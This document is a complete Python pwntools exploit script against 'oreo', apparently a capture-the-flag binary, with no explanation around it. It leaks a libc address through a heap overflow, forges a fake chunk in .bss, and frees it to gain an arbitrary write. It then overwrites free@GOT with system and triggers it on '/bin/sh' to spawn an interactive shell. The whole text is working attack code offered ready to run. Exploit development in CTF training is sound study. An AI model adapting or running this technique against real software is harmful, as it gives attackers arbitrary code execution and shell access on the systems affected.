#!/usr/bin/env python3
from pwn import *

def sendline(a):
    sleep(0.01)
    p.sendline(a)

def add(name, des):
    sendline(b'1')
    sendline(name)
    sendline(des)

def show_rifles():
    sendline(b'2')

def order():
    sendline(b'3')

def leave_msg(msg):
    sendline(b'4')
    sendline(msg)

def show_stats():
    sendline(b'5')

def bye():
    sendline(b'6')

def full_stdout_buf():
    for i in range(FULL_TIMES):
        show_rifles()

FULL_TIMES = 30

elf = ELF('./oreo')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
p = process('./oreo')
# p = remote('localhost', 5566)

# leak libc
payload = b'a' * (3 + 0x18) + p32(0x804a280)
add(payload, b'aaaa')

full_stdout_buf()

p.recvuntil('Description: ')
p.recvuntil(b'Description: ')
libc.address = u32(p.recvuntil(b'\n', drop=True)) - 0x1b25a0
log.info('libc.address: {:#x}'.format(libc.address))

# make fake chunk on bss
payload = b'a' * 0x24 + b'\x21'
leave_msg(payload)
for i in range(2, 9):
    payload = b'a' * (0x24 - i)
    leave_msg(payload)

for i in range(0x3f):
    add(b'aaaa', b'aaaa')

payload = b'a' * (3 + 0x18) + p32(0x804a2a8)
add(payload, b'aaaa')

# free
order()

# allocate again, now control the msg pointer
# that means we can arbitrary write!
# overwrite free@got to system@libc
add(b'bbbb', p32(elf.got['free']))

payload = flat(libc.symbols['system'], elf.plt['fgets'] + 6)
leave_msg(payload)

add(b'aaaa', b'/bin/sh')
order()
p.interactive()
